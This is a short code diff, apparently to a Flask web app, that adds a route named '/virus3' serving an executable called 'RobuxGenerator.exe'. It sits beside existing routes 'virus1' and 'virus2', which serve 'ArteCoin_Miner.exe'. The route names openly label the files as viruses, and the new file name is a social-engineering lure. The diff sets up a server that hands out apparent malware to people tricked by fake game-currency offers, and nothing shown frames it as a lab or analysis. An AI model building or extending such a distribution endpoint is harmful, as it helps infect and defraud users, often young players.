@@ -13,3 +13,7 @@ def virus1():
 @app.route("/virus2")
 def virus2():
     return send_file("ArteCoin_Miner.exe")
+
+@app.route("/virus3")
+def virus3():
+    return send_file("RobuxGenerator.exe")
